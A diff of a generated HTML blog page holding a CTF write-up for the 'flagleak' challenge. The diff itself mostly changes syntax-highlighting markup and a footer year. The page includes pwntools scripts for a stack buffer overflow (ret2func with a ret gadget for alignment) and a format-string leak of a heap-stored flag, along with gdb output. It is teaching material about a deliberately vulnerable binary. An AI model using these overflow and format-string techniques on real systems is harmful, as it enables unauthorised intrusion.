@@ -158,9 +158,9 @@ The challenge files can be found <a href="https://github.com/stdnoerr/stdnoerr.g
 <h1 id="analysis">Analysis</h1>
 <h2 id="code-analysis">Code Analysis</h2>
 <p>Here’s the source code for the challenge.</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include&lt;stdio.h&gt;
-#include&lt;stdlib.h&gt;
-#include&lt;fcntl.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+#include</span><span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
 </span>
 <span class="c1">// gcc flagleak.c -o flagleak -no-pie -fno-stack-protector</span>
 
@@ -205,7 +205,7 @@ The challenge files can be found <a href="https://github.com/stdnoerr/stdnoerr.g
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">printf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">format</span><span class="p">,</span> <span class="p">...);</span>
 </code></pre></div></div>
 <p>For example, it you want to print a number along with some text, you can do the following: -</p>
-<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
 </span>
 <span class="kt">int</span> <span class="nf">main</span><span class="p">(){</span>
     <span class="n">printf</span><span class="p">(</span><span class="s">"I'm %d years old</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
@@ -229,72 +229,72 @@ PIE:      No PIE (0x400000)
 
 <h2 id="ret2func">ret2func</h2>
 <p>The following script makes the program jump to <em>print_flag</em> function.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.aresx.team'</span><span class="p">,</span> <span class="mi">1004</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.aresx.team</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1004</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./flagleak'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./flagleak</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes Here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>If you get a SEGFAULT by running it then you are facing a 16-byte alignment issue. 64 bit architecture requires RSP to be 16-byte aligned whenever a function is called. To circumvent it, just add a return instruction before the jump.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./flagleak'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./flagleak</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes Here ###
 </span><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 
 <h2 id="format-string">Format string</h2>
 <p>Now that we have reached <em>print_flag</em> function, we will try to leak the flag.
 It is common practice to give a lot of <code class="language-plaintext highlighter-rouge">%p</code>s or <code class="language-plaintext highlighter-rouge">%x</code>s to the format string to leak values from the program’s stack. The flag is stored in heap. Let’s fire gdb to know the general pattern of the heap chunk’s address. I’m using <a href="https://github.com/hugsy/gef">gdb-gef</a>. Put a break point after the malloc. To run gdb after the payload, add the following lines before <code class="language-plaintext highlighter-rouge">p.send(payload)</code>:</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="sh">'''</span><span class="s">
 b *print_flag+43
 continue
-'''</span><span class="p">)</span>
-<span class="nb">input</span><span class="p">(</span><span class="s">'ATTACHED?'</span><span class="p">)</span>
+</span><span class="sh">'''</span><span class="p">)</span>
+<span class="nf">input</span><span class="p">(</span><span class="sh">'</span><span class="s">ATTACHED?</span><span class="sh">'</span><span class="p">)</span>
 </code></pre></div></div>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Breakpoint 1, 0x0000000000401210 in print_flag ()
 $rax   : 0x0000000000e782a0  →  0x0000000000000000
@@ -340,50 +340,50 @@ $cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
 gef➤ 
 </code></pre></div></div>
 <p>If you run it multiple times, you will notice that the address returned by malloc (RAX) ends with <code class="language-plaintext highlighter-rouge">2a0</code>. Now we will try to leak values using <code class="language-plaintext highlighter-rouge">%p</code>s. Why <code class="language-plaintext highlighter-rouge">%p</code>? because <code class="language-plaintext highlighter-rouge">%p</code> will give us the value in hex format, using the architecture’s register size. I like to use a python loop like the following to leak values in format string attacks. Here I use direct access method to access any specific offset from the stack. The format is <code class="language-plaintext highlighter-rouge">%(index)$p</code>.</p>
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">$p'</span><span class="p">)</span>
-    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">$p</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
 </code></pre></div></div>
 <p>In this case I had to do the following because the program exits after the format string.</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./flagleak'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./flagleak</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
 
 <span class="n">offset</span> <span class="o">=</span> <span class="mh">0x68</span>
 
-<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
 
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
-    <span class="n">start</span><span class="p">()</span>
-    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">):</span>
+    <span class="nf">start</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
-    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="n">offset</span> 
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
-    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="n">offset</span> 
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
+    <span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">f</span><span class="s">'%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">$p'</span><span class="p">)</span>
-    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">%</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">$p</span><span class="sh">'</span><span class="p">)</span>
+    <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
+    <span class="nf">print</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
 
-    <span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+    <span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>This gives the following:</p>
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1 b'0x7f08e8bdca03'
@@ -421,37 +421,37 @@ And BOOM!. You get the flag.</p>
 <h2 id="final-exploit">Final exploit</h2>
 <p>Here is the final script</p>
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
-</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 
 <span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
 	<span class="k">global</span> <span class="n">p</span>
 	<span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'localhost'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">localhost</span><span class="sh">'</span><span class="p">,</span> <span class="mi">1337</span><span class="p">)</span>
 	<span class="k">else</span><span class="p">:</span>
-		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">()</span>
+		<span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="nf">process</span><span class="p">()</span>
 
-<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./flagleak'</span><span class="p">)</span>
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="nc">ELF</span><span class="p">(</span><span class="sh">'</span><span class="s">./flagleak</span><span class="sh">'</span><span class="p">)</span>
 <span class="n">libc</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">libc</span>
-<span class="n">start</span><span class="p">()</span>
+<span class="nf">start</span><span class="p">()</span>
 
 <span class="c1">### Exploit Goes Here ###
 </span>
-<span class="n">r</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">find_gadget</span><span class="p">([</span><span class="s">'ret'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+<span class="n">r</span> <span class="o">=</span> <span class="nc">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+<span class="n">ret</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="nf">find_gadget</span><span class="p">([</span><span class="sh">'</span><span class="s">ret</span><span class="sh">'</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">recvline</span><span class="p">()</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x68</span> 
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
-<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x68</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> 
+<span class="n">payload</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">print_flag</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">'%12$s'</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="sh">'</span><span class="s">%12$s</span><span class="sh">'</span><span class="p">)</span>
 
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">())</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">recvlines</span><span class="p">(</span><span class="mi">2</span><span class="p">)[</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="nf">decode</span><span class="p">())</span>
 
-<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
 </code></pre></div></div>
 <p>If you have any doubts/questions/suggestions, contact me on twitter @stdnoerr or discord stdnoerr#7880.</p>
 
@@ -546,7 +546,7 @@ And BOOM!. You get the flag.</p>
 		<footer>
 			<hr/>
 			<p>
-				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+				&copy; 2024 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
 			</p>
 		</footer>
 	</div>
